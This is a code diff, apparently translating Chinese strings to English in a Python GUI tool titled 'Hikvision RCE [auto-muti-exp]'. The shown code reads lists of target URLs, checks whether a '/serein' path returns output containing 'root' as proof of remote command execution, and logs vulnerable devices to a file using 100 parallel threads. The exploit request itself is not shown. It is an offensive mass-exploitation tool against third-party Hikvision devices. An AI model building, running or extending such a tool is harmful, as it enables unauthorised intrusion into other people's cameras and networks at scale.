@@ -6,7 +6,7 @@ import tkinter as tk
 from tkinter import scrolledtext
 from ttkbootstrap.constants import *
 def get_hkvurl():
-    with open("修正后的url.txt","r") as f:
+    with open("corrected url.txt","r") as f:
         for address in f.readlines():
             address = address.strip()
             yield address
@@ -34,21 +34,21 @@ def hkv_rce(address):
             url2 = address + "/serein"
             resp2 = requests.get(url2,timeout=3,verify=False)
             if "root" in resp2.text:
-                hkv_text.insert(END, chars="【O(∩_∩)O】存在漏洞并且可以执行！存在漏洞的url为：" + url2 + "\n")
+                hkv_text.insert(END, chars="[O(∩_∩)O]Vulnerable and executable!Vulnerable url:" + url2 + "\n")
                 hkv_text.see(END)
-                with open("存在海康威视RCE漏洞的url.txt", "a+") as m:
+                with open("[exists]Hikvision_RCE_url.txt", "a+") as m:
                     m.write(url2 + "\n")
             else:
-                hkv_text.insert(END, chars="【×××】不存在漏洞！url为：" + url2 + "\n")
+                hkv_text.insert(END, chars="[×]URL without vulnerability:" + url2 + "\n")
                 hkv_text.see(END)
     except Exception as e:
-        hkv_text.insert(END, chars="【×××】出错了！报错内容为：" + str(e) + "\n")
+        hkv_text.insert(END, chars="[×]The target request failed, and the error content:" + str(e) + "\n")
         hkv_text.see(END)
 
 def hkv_rce_gui():
     hkv_gui = Toplevel()
     hkv_gui.geometry("1035x455")
-    hkv_gui.title("海康威视RCE一把梭")
+    hkv_gui.title("Hikvision RCE [auto-muti-exp]")
     hkv_gui.resizable(0, 0)
     logo = PhotoImage(file="./logo.ico")
     hkv_gui.tk.call('wm', 'iconphoto', hkv_gui._w, logo)
@@ -56,7 +56,6 @@ def hkv_rce_gui():
     hkv_text = scrolledtext.ScrolledText(hkv_gui,width=119, height=24)
     hkv_text.grid(row=4, columnspan=3, padx=20, pady=10)
     hkv_text.see(END)
-    # 最大线程数
     max_thread_num = 100
     executor = ThreadPoolExecutor(max_workers=max_thread_num)
     addresses = get_hkvurl()
